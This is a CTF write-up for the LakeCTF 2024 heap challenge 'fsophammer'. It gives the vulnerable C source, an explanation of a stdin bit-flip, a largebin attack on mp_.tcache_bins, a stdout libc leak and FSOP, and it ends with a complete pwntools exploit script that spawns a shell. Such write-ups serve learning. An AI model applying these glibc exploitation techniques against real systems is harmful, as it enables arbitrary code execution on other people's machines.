---
title: fsophammer
date: 2025-12-29
tags: 
- pwn
- author-fs
categories: LakeCTF 2024
---

by {% person fs %}


My first attempt at a leakless pwn. Below is the source code of the program.

```c
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#define N_ENTRIES 4
#define MAX_SZ 0x3000

const char banner[] = "\n\n"
"  _________.____       _____      _____            .____   ._.   ____.\n"
" /   _____/|    |     /  _  \\    /     \\           |   _|  | |  |_   |\n"
" \\_____  \\ |    |    /  /_\\  \\  /  \\ /  \\          |  |    |_|    |  |\n"
" /        \\|    |___/    |    \\/    Y    \\         |  |    |-|    |  |\n"
"/_______  /|_______ \\____|__  /\\____|__  /         |  |_   | |   _|  |\n"
"        \\/         \\/       \\/         \\/          |____|  |_|  |____|\n"
"    ______________ ______________                          ._.        \n"
"    \\__    ___/   |   \\_   _____/                          | |        \n"
"      |    | /    ~    \\    __)_                           |_|        \n"
"      |    | \\    Y    /        \\                          |-|        \n"
"      |____|  \\___|_  /_______  /                          | |        \n"
"                    \\/        \\/                           |_|        \n\n";
char* entries [N_ENTRIES];
int slammed = 0;

void init_setup(void) __attribute__ ((constructor));
void alloc();
void free();
void slam();

void init_setup() {
  setbuf(stdout,NULL);
  setbuf(stderr,NULL);
}

int get_num(const char* prompt, size_t* num, size_t bound) {
  printf("%s> ", prompt);
  int scanned = scanf("%zu",num);
  getchar();
  if((scanned != 1) || (bound && *num >= bound)) {
    puts("[-] getnum");
    return -1;
  }
  return 0;
}

void get_str(char* buf, size_t cap) {
  char c;
  printf("content> ");
  // I'm so nice that you won't have to deal with null bytes
  for (int i = 0 ; i < cap ; ++i) {
    int scanned = scanf("%c",&c);
    if (scanned !=1 || c=='\n') {
      return;
    }
    buf[i] = c;
  }
}

void alloc() {
  size_t idx;
  size_t sz;
  if(get_num("index",&idx,N_ENTRIES)) {
    return;
  }
  if(get_num("size",&sz,MAX_SZ)) {
    return;
  }
  entries[idx] = malloc(sz);
  get_str(entries[idx],sz);
  printf("alloc at index: %zu\n", idx);
}

void free_() {
  size_t idx;
  if(get_num("index",&idx,N_ENTRIES)) {
    return;
  }
  if(!entries[idx]) {
    return;
  }
  free(entries[idx]);
  entries[idx] = NULL;
}


void slam() {
  size_t idx;
  size_t pos;
  puts("is this rowhammer? is this a cosmic ray?");
  puts("whatever, that's all you'll get!");
  if (get_num("index",&idx,sizeof(*stdin))) {
    return;
  }

  if (idx < 64) {
    puts("[-] invalid index");
    return;
  }

  if (get_num("pos",&pos,8)) {
    return;
  }
  unsigned char byte = ((char*)stdin)[idx];
  unsigned char mask = ((1<<8)-1) & ~(1<<pos);
  byte = (byte & mask) | (~byte & (~mask));
  ((char*)stdin)[idx] = byte;
}

void menu() {
  puts("1. alloc\n2. free\n3. slam");
  size_t cmd;

  if (get_num("cmd",&cmd, 0)) {
    return;
  }

  switch(cmd) {
    case 1:
      alloc();
      break;
    case 2:
      free_();
      break;
    case 3:
      if (!slammed) {
        slam();
        slammed = 1;
      } else {
        puts("[-] slammed already");
      }
      break;
    default:
      puts("[-] invalid cmd");
      break;
  }
}

int main() {
  puts(banner);
  while(1) {
    menu();
  }
  return 0;
}  
```

We are allowed 1 bit flip in the stdin file struct but only after 0x40 bytes (_IO_buf_end and onwards) from the start of the stdin file struct and this is a classic write on alloc challenge with no apparent UAF/double free.

Quick lore drop: _IO_2_1_stdin_ holds a buffer which holds in user input (as marked by _IO_buf_base and _IO_buf_end typically 0x1000 bytes) before transferring everything to the acctual destination addr. However, if we were to bitflip one of the bits of _IO_buf_end such that _IO_buf_end-_IO_buf_base>>>>0x1000, we can read in past the allocated buffer chunk into other chunks

This allows us to overwrite other chunks metadata which is what I did for this challenge

I first set up a chunk 0 (victim chunk) and chunk 1 (chunk holding our fake chunk and also the chunk that will be involved in a largebin attack I will explain later). After allocating a guard chunk and allocating the smaller chunk than chunk 1 to be the 2nd chunk involved in the largebin attack, I allocated another guard chunk and a 3rd chunk of 0x430 (to be fair, I'm not sure of the purpose of this but it was around 1-2am when I was writing this exploit lol). After doing a bitflip on _IO_buf_end of _IO_2_1_stdin_, I overwrote the chunk metadata of chunk 0 to artificially increase it's size to end where the fake chunk would be in chunk 1

I then freed chunk 1 to end up in unsorted and to send it away from unsorted to largebin, I allocated a chunk larger than chunk 1's size. Now if I freed chunk 0 which is now overlapping with chunk 1 that is FREED (coz of the size increase) and use remaindering to malloc back the chunk, I can overwrite the metadata like (fd_nextsize,bck_nextsize) in chunk 1 in largebin. 

```
if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
		fwd = bck;
		bck = bck->bk;
		victim->fd_nextsize = fwd->fd;
		victim->bk_nextsize = fwd->fd->bk_nextsize;
		fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
	}
```

Looking at this, I can see if I were to overwrite the bk_nextsize of chunk 1 and then send a chunk which has a size smaller than that of chunk 1 (chunk 2) but belonging in the same bin, it will trigger an arbitrary write where [target-0x20]=chunk 1 address. So, once we free chunk 2 then malloc something greater than chunk 2 to send it to largebin, our arb write will be trigerred. But what do we even arb write? We dont have a libc leak. 

To expand our attack vector, we need to exploit malloc_par which I won't go into detail since the article below would do it better than me anyway
(https://4xura.com/binex/pwn-mp_-exploiting-malloc_par-to-gain-tcache-bin-control/)
but basically, if we overwrite mp_.tcache_bins to be greater than 64, it will allow for OOB access of the tcache_perthread_strcut->entries and given entires contain the UNMANGLED pointers of the chunk addresses, if we were to send a chunk to unsorted beforehand, malloc it back but partial overwrite the unsorted bin pointer to point to _IO_2_1_stdout_ and try calling malloc(>0x410) where through csize2idx(), tcache will reference the pointer in entries[OOB index]=_IO_2_1_stdout, this will let us get arbritrary allocation of stdout. However for this to work, tcache_perthread_struct->counts[OOB index] should also be set > 1. But this is trivial since when we do an extended read into the _IO_2_1_stdin_ buffer as mentioned earlier we can overwrite the 0x1000 chunk with multiple p16(0x3) to fake counts. 

```c
static __always_inline bool
tcache_available (size_t tc_idx)
{
  if (tc_idx < mp_.tcache_bins
      && tcache != NULL
      && tcache->counts[tc_idx] > 0)
    return true;
  else
    return false;
}
```

If this doesnt sound like it makes sense, check out the article coz once again, it explains the concept way better than me.

Remember the fact I can overwrite bk_nextsize of chunk 1? Why not just partial overwrite bk_nextsize of chunk 1 to mp.tcache_bins-0x20 so when the largebin attack is trigerred, mp.tcache_bins-0x20+0x20=chunk 1 addr. Now, we simply have to allocate a chunk of a huge size such that tcache will return the partially overwritten unsorted bin pointer that now points to _IO_2_1_stdout as our chunk. 

To get libc leak, we can set the flags of stdout to 0xfbad1887 and overwrite everything up till the LSB of _IO_write_base which we will deliberately set to 0x0 to make it smaller than _IO_write_base so when puts() is called, it will call a long chain of functions that will eventually lead to 

```
return _IO_do_write (f, f->_IO_write_base,
			 f->_IO_write_ptr - f->_IO_write_base);
```
A more detailed explanation of the long call of functions can be found here (https://faraz.faith/2020-10-13-FSOP-lazynote/) but I think looking through elixir bootlin code for _IO_new_file_xsputn should more or less grant you the answer.

Once we get our libc leak, we can now perform FSOP over stdout and get shell. Now it is to be noted I did this challenge under 2.41 (too lazy to do it for 2.39) so my fsop payload might be slightly different. Full payload below

```py
from pwn import *

p=process("./fsophammer")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#gdb.attach(p)
context(os='linux',arch='amd64')

#size 0x428, 0x418 for largebin

def malloc(idx,size,content):
    p.recvuntil(b'cmd>')
    p.sendline(b'1')
    p.recvuntil(b'index>')
    p.sendline(str(idx).encode('utf-8'))
    p.recvuntil(b'size>')
    p.sendline(str(size).encode('utf-8'))
    p.recvuntil(b'content>')
    p.sendline(content)

def free(idx):
    p.recvuntil(b'cmd>')
    p.sendline(b'2')
    p.recvuntil(b'index>')
    p.sendline(str(idx).encode('utf-8'))

def slam(offset,byte):
    p.recvuntil(b'cmd>')
    p.sendline(b'3')
    p.recvuntil(b'index>')
    p.sendline(str(offset).encode('utf-8'))
    p.recvuntil(b'pos>')
    p.sendline(str(byte).encode('utf-8'))

malloc(0,0x420,"")
#free(0)
#malloc(0,0x2,b"\xc0\x55")
#malloc(0,0x400,b"a")
malloc(1,0x428,b"A"*0x60+p64(0x0)+p64((0x3c0+0x20)|1))
malloc(2,0x18,b"")
malloc(2,0x418,p64(0x0))
malloc(3,0x18,b"")
malloc(3,0x430,b"C")
slam(67,5)#
malloc(3,0x1010,p16(0x3)*(0x1000//0x2)+p64(0x0)+p64(0x501-0x60))
sleep(0.1)
free(1)
malloc(3,0x430,b"A")

free(0)
#malloc(0,0x2,b"\xc0\x55")
malloc(1,0x430,b"A")
#malloc(0,0x430,b"A")
malloc(0,0xa,b"A"*0x8+b"\xc8\x41")
malloc(0,0x2,b"\xc0\x55")
free(1)
malloc(1,0x430,b"\xc0\x55")
#malloc(1,0x2,b"\xe0\x54")


free(2)

malloc(3,0x1000,b"A")

malloc(0,0x2d10,p64(0xfbad1887)+p64(0x0)*3+b"\x00")
buffer=p.recvuntil(b"alloc")[1:-5]
print(buffer)
libc_leak=u64(buffer[:0x8].ljust(8,b"\x00"))
print(hex(libc_leak))
libc_base=libc_leak-0x1e8644
libc.address=libc_base
gadget=libc.address+0x0000000000150a0c
stdout=libc.sym['_IO_2_1_stdout_']
fake_vtable=libc.sym['_IO_wfile_jumps']-0x18
stdout_lock=libc.address+0x1e97b0
fake = FileStructure(0)
fake.flags = 0xfbad2888
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
payload=bytes(fake)
input("")
malloc(1,0x2450,payload)

p.interactive()
```

I hope I explained everything correctly but if I made some inaccuracy, dm me in discord @baaaa_fs7 so I can correct it lol.
